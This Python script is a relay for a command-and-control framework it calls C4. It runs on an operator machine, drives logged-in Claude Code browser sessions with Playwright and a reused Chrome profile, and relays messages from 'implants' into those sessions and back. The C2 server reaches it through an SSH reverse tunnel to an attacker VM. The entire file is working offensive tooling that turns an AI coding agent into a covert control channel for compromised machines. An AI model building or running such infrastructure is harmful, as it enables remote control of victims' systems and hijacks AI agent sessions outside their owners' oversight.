#!/usr/bin/env python3
"""
Local Browser Bridge Service

Runs on the operator's local machine with authenticated browser access.
Accepts WebSocket connections from the C4 server (via SSH tunnel) and
executes browser automation commands against Claude Code sessions.

Usage:
    python browser_bridge_local.py --port 8888

    # Then on attacker VM, C4 server connects to localhost:8888 via tunnel
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import shutil
import signal
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any

import websockets
from websockets.server import WebSocketServerProtocol
from playwright.async_api import (
    BrowserContext,
    Page,
    TimeoutError as PlaywrightTimeout,
    async_playwright,
)
from rich.console import Console
from rich.logging import RichHandler
from rich.panel import Panel

# ---------------------------------------------------------------------------
# DOM selectors (same as browser_bridge.py)
# ---------------------------------------------------------------------------

INPUT_SELECTOR = 'div.tiptap.ProseMirror[contenteditable="true"]'
SUBMIT_SELECTOR = 'button[type="submit"][aria-label="Submit"]'
INTERRUPT_SELECTOR = 'button[aria-label="Interrupt"]'
MESSAGE_GROUP = '[class*="group/message"]'
USER_MSG = '[class*="ml-auto"][class*="max-w-"]'
SPINNER_SELECTOR = "span.code-spinner-animate"
SHIMMER_SELECTOR = '[class*="shimmertext"]'

# ---------------------------------------------------------------------------
# Logging setup with Rich
# ---------------------------------------------------------------------------

console = Console()
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(console=console, rich_tracebacks=True, show_path=False)],
)
log = logging.getLogger("bridge")

# ---------------------------------------------------------------------------
# Session state
# ---------------------------------------------------------------------------


@dataclass
class BrowserSession:
    """Tracks a single browser session for an implant."""

    implant_id: str
    bridge_url: str
    page: Page | None = None
    context: BrowserContext | None = None
    status: str = "initializing"
    last_activity: datetime = field(default_factory=datetime.now)
    _msg_count_at_send: int = 0


# ---------------------------------------------------------------------------
# Browser Bridge Logic
# ---------------------------------------------------------------------------


class LocalBrowserBridge:
    """Manages browser sessions using local Playwright."""

    def __init__(self, headless: bool = False, chrome_profile: str | None = None) -> None:
        self.headless = headless
        # Chrome profile directory for persistent login
        # On macOS: ~/Library/Application Support/Google/Chrome/Default
        # On Linux: ~/.config/google-chrome/Default
        # On Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default
        self.chrome_profile = chrome_profile
        self._sessions: dict[str, BrowserSession] = {}
        self._playwright = None
        self._context = None  # Persistent context when using Chrome profile

    async def start(self) -> None:
        """Initialize Playwright browser."""
        log.info("Starting Playwright browser (headless=%s)", self.headless)
        self._playwright = await async_playwright().start()

        if self.chrome_profile:
            # Use persistent context with existing Chrome profile (has Claude login)
            log.info("Using Chrome profile: %s", self.chrome_profile)
            self._context = await self._playwright.chromium.launch_persistent_context(
                user_data_dir=self.chrome_profile,
                headless=self.headless,
                channel="chrome",
            )
            log.info("[green]Browser started with persistent profile[/]", extra={"markup": True})
        else:
            # Fresh browser - will need to login manually
            log.warning("[yellow]No Chrome profile specified - sessions may require login[/]", extra={"markup": True})
            browser = await self._playwright.chromium.launch(
                headless=self.headless,
                channel="chrome",
            )
            self._context = await browser.new_context()
            log.info("[green]Browser started (fresh context)[/]", extra={"markup": True})

    async def stop(self) -> None:
        """Clean up browser resources."""
        for session in list(self._sessions.values()):
            await self._close_session(session.implant_id)
        if self._context:
            await self._context.close()
        if self._playwright:
            await self._playwright.stop()
        log.info("Browser stopped")

    async def open_session(self, implant_id: str, bridge_url: str) -> dict[str, Any]:
        """Open a new browser session for an implant."""
        if implant_id in self._sessions:
            session = self._sessions[implant_id]
            if session.page and not session.page.is_closed():
                session.status = "ready"
                session.last_activity = datetime.now()
                log.info("[yellow]Session %s already open, reusing[/]", implant_id[:12], extra={"markup": True})
                return {"status": "ok", "data": "session reused"}

        log.info("[cyan]Opening session for %s[/]", implant_id[:12], extra={"markup": True})
        log.info("  URL: %s", bridge_url[:80] + "..." if len(bridge_url) > 80 else bridge_url)

        session = BrowserSession(implant_id=implant_id, bridge_url=bridge_url, status="connecting")
        self._sessions[implant_id] = session

        try:
            # Use the shared context (has Claude auth cookies)
            page = await self._context.new_page()
            session.context = self._context
            session.page = page

            await page.goto(bridge_url, wait_until="domcontentloaded")
            session.status = "waiting_for_input"

            # Wait for input area
            await page.locator(INPUT_SELECTOR).wait_for(state="visible", timeout=30000)

            session.status = "ready"
            session.last_activity = datetime.now()
            log.info("[green]Session %s ready[/]", implant_id[:12], extra={"markup": True})
            return {"status": "ok", "data": "session opened"}

        except PlaywrightTimeout:
            session.status = "timeout"
            screenshot_path = f"/tmp/bridge_debug_{implant_id[:8]}.png"
            if session.page:
                await session.page.screenshot(path=screenshot_path)
            log.error("[red]Timeout waiting for input on %s[/]", implant_id[:12], extra={"markup": True})
            log.error("  Screenshot: %s", screenshot_path)
            return {"status": "error", "error": f"timeout waiting for input, screenshot at {screenshot_path}"}

        except Exception as e:
            session.status = "error"
            log.error("[red]Failed to open session %s: %s[/]", implant_id[:12], e, extra={"markup": True})
            return {"status": "error", "error": str(e)}

    async def send_message(self, implant_id: str, text: str) -> dict[str, Any]:
        """Send a message to the Claude session."""
        session = self._sessions.get(implant_id)
        if not session or not session.page:
            return {"status": "error", "error": f"no session for {implant_id[:12]}"}

        page = session.page
        session.status = "sending"
        session.last_activity = datetime.now()

        try:
            # Record message count
            session._msg_count_at_send = await page.locator(MESSAGE_GROUP).count()

            # Wait for idle
            await self._wait_until_idle(page, timeout=60.0)

            # Clear and type
            input_el = page.locator(INPUT_SELECTOR)
            await input_el.click()
            await page.keyboard.press("Control+a")
            await page.keyboard.press("Backspace")
            await input_el.press_sequentially(text, delay=10)

            await asyncio.sleep(0.3)

            # Submit
            submit_btn = page.locator(SUBMIT_SELECTOR)
            if await submit_btn.count() > 0:
                disabled = await submit_btn.get_attribute("disabled")
                if disabled is None:
                    await submit_btn.click()
                else:
                    await input_el.press("Enter")
            else:
                await input_el.press("Enter")

            session.status = "sent"
            log.info("[green]Sent to %s[/] (%d chars)", implant_id[:12], len(text), extra={"markup": True})
            return {"status": "ok", "data": None}

        except Exception as e:
            session.status = "error"
            log.error("[red]Send failed for %s: %s[/]", implant_id[:12], e, extra={"markup": True})
            return {"status": "error", "error": str(e)}

    async def wait_response(self, implant_id: str, timeout: float = 120.0) -> dict[str, Any]:
        """Wait for Claude's response and return the text."""
        session = self._sessions.get(implant_id)
        if not session or not session.page:
            return {"status": "error", "error": f"no session for {implant_id[:12]}"}

        page = session.page
        session.status = "waiting_response"
        session.last_activity = datetime.now()

        log.info("[yellow]Waiting for response from %s...[/]", implant_id[:12], extra={"markup": True})

        try:
            # Wait for processing to start
            try:
                await page.locator(f"{INTERRUPT_SELECTOR}, {SPINNER_SELECTOR}").first.wait_for(
                    state="visible", timeout=10000
                )
            except PlaywrightTimeout:
                pass  # May have already started/finished

            # Poll for completion
            last_text = ""
            stable_count = 0
            elapsed = 0.0
            poll_interval = 1.0

            while elapsed < timeout:
                await asyncio.sleep(poll_interval)
                elapsed += poll_interval

                is_processing = await self._is_processing(page)
                current_text = await self._get_last_response_text(page)

                if current_text == last_text and current_text:
                    stable_count += 1
                else:
                    stable_count = 0
                    last_text = current_text

                if not is_processing and stable_count >= 2:
                    session.status = "ready"
                    session.last_activity = datetime.now()
                    log.info(
                        "[green]Response received from %s[/] (%d chars)",
                        implant_id[:12],
                        len(last_text),
                        extra={"markup": True},
                    )
                    return {"status": "ok", "data": last_text}

                if stable_count >= 5:
                    session.status = "ready"
                    session.last_activity = datetime.now()
                    log.info(
                        "[yellow]Response stable (fallback) from %s[/] (%d chars)",
                        implant_id[:12],
                        len(last_text),
                        extra={"markup": True},
                    )
                    return {"status": "ok", "data": last_text}

            session.status = "timeout"
            log.warning("[red]Response timeout from %s[/]", implant_id[:12], extra={"markup": True})
            return {"status": "ok", "data": last_text}  # Return partial

        except Exception as e:
            session.status = "error"
            log.error("[red]Wait failed for %s: %s[/]", implant_id[:12], e, extra={"markup": True})
            return {"status": "error", "error": str(e)}

    async def close_session(self, implant_id: str) -> dict[str, Any]:
        """Close a browser session."""
        await self._close_session(implant_id)
        return {"status": "ok", "data": None}

    async def _close_session(self, implant_id: str) -> None:
        session = self._sessions.pop(implant_id, None)
        if not session:
            return
        # Only close the page, not the shared context (preserves auth cookies)
        if session.page and not session.page.is_closed():
            await session.page.close()
        log.info("Closed session %s", implant_id[:12])

    async def _is_processing(self, page: Page) -> bool:
        """Check if Claude is processing."""
        for selector in [INTERRUPT_SELECTOR, SPINNER_SELECTOR, SHIMMER_SELECTOR]:
            loc = page.locator(selector)
            if await loc.count() > 0 and await loc.is_visible():
                return True
        return False

    async def _wait_until_idle(self, page: Page, timeout: float = 60.0) -> None:
        """Wait until Claude is not processing."""
        elapsed = 0.0
        while elapsed < timeout:
            if not await self._is_processing(page):
                return
            await asyncio.sleep(0.5)
            elapsed += 0.5
        raise TimeoutError("Claude still processing after timeout")

    async def _get_last_response_text(self, page: Page) -> str:
        """Get text from last assistant message."""
        messages = page.locator(MESSAGE_GROUP)
        count = await messages.count()
        if count == 0:
            return ""

        for i in range(count - 1, -1, -1):
            msg = messages.nth(i)
            user_parts = msg.locator(USER_MSG)
            if await user_parts.count() > 0:
                continue
            return (await msg.inner_text()).strip()
        return ""

    def get_sessions_info(self) -> list[dict[str, Any]]:
        """Get info about all active sessions for display."""
        return [
            {
                "implant_id": s.implant_id[:12],
                "status": s.status,
                "last_activity": s.last_activity.strftime("%H:%M:%S"),
            }
            for s in self._sessions.values()
        ]


# ---------------------------------------------------------------------------
# WebSocket Server
# ---------------------------------------------------------------------------


class BridgeServer:
    """WebSocket server that accepts commands from C4 server."""

    def __init__(self, bridge: LocalBrowserBridge, host: str = "localhost", port: int = 8888) -> None:
        self.bridge = bridge
        self.host = host
        self.port = port
        self._server = None
        self._connections: set[WebSocketServerProtocol] = set()

    async def start(self) -> None:
        """Start the WebSocket server."""
        self._server = await websockets.serve(
            self._handle_connection,
            self.host,
            self.port,
        )
        log.info(
            "[bold green]Bridge server listening on ws://%s:%d[/]",
            self.host,
            self.port,
            extra={"markup": True},
        )

    async def stop(self) -> None:
        """Stop the WebSocket server."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
        log.info("Bridge server stopped")

    async def _handle_connection(self, websocket: WebSocketServerProtocol) -> None:
        """Handle a WebSocket connection from C4 server."""
        self._connections.add(websocket)
        remote = websocket.remote_address
        log.info("[cyan]C4 server connected from %s[/]", remote, extra={"markup": True})

        try:
            async for message in websocket:
                try:
                    request = json.loads(message)
                    response = await self._dispatch(request)
                    await websocket.send(json.dumps(response))
                except json.JSONDecodeError as e:
                    await websocket.send(json.dumps({"status": "error", "error": f"invalid JSON: {e}"}))
                except Exception as e:
                    log.exception("Error handling request")
                    await websocket.send(json.dumps({"status": "error", "error": str(e)}))
        finally:
            self._connections.discard(websocket)
            log.info("[yellow]C4 server disconnected[/]", extra={"markup": True})

    async def _dispatch(self, request: dict[str, Any]) -> dict[str, Any]:
        """Dispatch a request to the appropriate handler."""
        action = request.get("action")
        implant_id = request.get("implant_id", "")

        if action == "open_session":
            bridge_url = request.get("bridge_url", "")
            return await self.bridge.open_session(implant_id, bridge_url)

        elif action == "send_message":
            text = request.get("text", "")
            return await self.bridge.send_message(implant_id, text)

        elif action == "wait_response":
            timeout = request.get("timeout", 120.0)
            return await self.bridge.wait_response(implant_id, timeout)

        elif action == "close_session":
            return await self.bridge.close_session(implant_id)

        elif action == "list_sessions":
            return {"status": "ok", "data": self.bridge.get_sessions_info()}

        elif action == "ping":
            return {"status": "ok", "data": "pong"}

        else:
            return {"status": "error", "error": f"unknown action: {action}"}

    @property
    def connection_count(self) -> int:
        return len(self._connections)


# ---------------------------------------------------------------------------
# SSH Tunnel Management
# ---------------------------------------------------------------------------


async def start_ssh_tunnel(
    remote_host: str,
    remote_port: int,
    local_port: int,
    ssh_key: str | None = None,
    ssh_user: str = "c4admin",
) -> subprocess.Popen | None:
    """Start an SSH reverse tunnel to the attacker VM."""
    ssh_path = shutil.which("ssh")
    if not ssh_path:
        log.error("[red]SSH not found in PATH[/]", extra={"markup": True})
        return None

    cmd = [
        ssh_path,
        "-N",  # No remote command
        "-T",  # Disable pseudo-terminal
        "-o", "ExitOnForwardFailure=yes",
        "-o", "ServerAliveInterval=30",
        "-o", "ServerAliveCountMax=3",
        "-R", f"{remote_port}:localhost:{local_port}",
    ]

    if ssh_key:
        cmd.extend(["-i", ssh_key])

    cmd.append(f"{ssh_user}@{remote_host}")

    log.info("[cyan]Starting SSH tunnel to %s...[/]", remote_host, extra={"markup": True})
    log.info("  Command: %s", " ".join(cmd))

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        # Give it a moment to establish
        await asyncio.sleep(2)

        if proc.poll() is not None:
            # Process exited - tunnel failed
            stderr = proc.stderr.read().decode() if proc.stderr else ""
            log.error("[red]SSH tunnel failed: %s[/]", stderr.strip(), extra={"markup": True})
            return None

        log.info("[green]SSH tunnel established[/]", extra={"markup": True})
        return proc

    except Exception as e:
        log.error("[red]Failed to start SSH tunnel: %s[/]", e, extra={"markup": True})
        return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


async def main() -> None:
    parser = argparse.ArgumentParser(description="Local Browser Bridge Service")
    parser.add_argument("--port", type=int, default=8888, help="WebSocket server port")
    parser.add_argument("--host", default="localhost", help="WebSocket server host")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument(
        "--chrome-profile",
        default=None,
        help="Path to Chrome profile directory with Claude login (e.g. ~/Library/Application Support/Google/Chrome/Default)",
    )
    parser.add_argument(
        "--tunnel-to",
        default=None,
        help="Attacker VM address to create SSH tunnel (e.g. 4.154.171.119 or user@host)",
    )
    parser.add_argument(
        "--ssh-key",
        default=None,
        help="Path to SSH private key for tunnel (e.g. ~/.ssh/c4_attacker_rsa)",
    )
    args = parser.parse_args()

    profile_info = f"Profile: {args.chrome_profile}" if args.chrome_profile else "[yellow]No profile - may need login[/]"
    tunnel_info = f"Tunnel: {args.tunnel_to}" if args.tunnel_to else "[dim]No tunnel (manual SSH required)[/]"

    console.print(
        Panel(
            "[bold]Local Browser Bridge[/]\n\n"
            f"WebSocket: ws://{args.host}:{args.port}\n"
            f"{profile_info}\n"
            f"{tunnel_info}",
            title="Starting",
            border_style="blue",
        )
    )

    # Parse tunnel destination
    ssh_proc = None
    if args.tunnel_to:
        if "@" in args.tunnel_to:
            ssh_user, remote_host = args.tunnel_to.split("@", 1)
        else:
            ssh_user = "c4admin"
            remote_host = args.tunnel_to

        ssh_proc = await start_ssh_tunnel(
            remote_host=remote_host,
            remote_port=args.port,
            local_port=args.port,
            ssh_key=args.ssh_key,
            ssh_user=ssh_user,
        )
        if not ssh_proc:
            console.print("[red]Failed to establish SSH tunnel. Continuing without tunnel...[/]")

    bridge = LocalBrowserBridge(headless=args.headless, chrome_profile=args.chrome_profile)
    server = BridgeServer(bridge, host=args.host, port=args.port)

    # Handle shutdown gracefully
    shutdown_event = asyncio.Event()

    def signal_handler():
        log.info("Shutting down...")
        shutdown_event.set()

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, signal_handler)

    try:
        await bridge.start()
        await server.start()

        # Run until shutdown
        await shutdown_event.wait()

    finally:
        await server.stop()
        await bridge.stop()

        # Clean up SSH tunnel
        if ssh_proc:
            log.info("Closing SSH tunnel...")
            ssh_proc.terminate()
            try:
                ssh_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                ssh_proc.kill()

        console.print("[bold red]Bridge stopped[/]")


if __name__ == "__main__":
    asyncio.run(main())
